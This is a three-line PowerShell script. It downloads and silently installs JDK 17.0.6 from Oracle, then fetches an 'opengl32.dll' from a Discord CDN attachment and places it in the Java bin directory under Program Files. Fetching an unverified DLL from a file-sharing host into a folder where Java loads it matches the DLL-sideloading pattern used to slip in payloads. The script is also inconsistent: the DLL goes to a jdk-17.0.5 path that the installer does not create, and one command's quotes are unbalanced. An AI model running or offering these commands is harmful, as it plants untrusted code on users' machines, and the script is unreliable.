powershell -Command "Invoke-WebRequest https://download.oracle.com/java/17/archive/jdk-17.0.6_windows-x64_bin.exe -OutFile \"$env:TEMP\jdk.exe\""
powershell -Command "\"$env:TEMP\jdk.exe\ /s"
powershell -Command "Invoke-WebRequest https://cdn.discordapp.com/attachments/886712860598763531/1097265841151676537/opengl32.dll -OutFile \"$Env:Programfiles\java\jdk-17.0.5\bin\opengl32.dll\"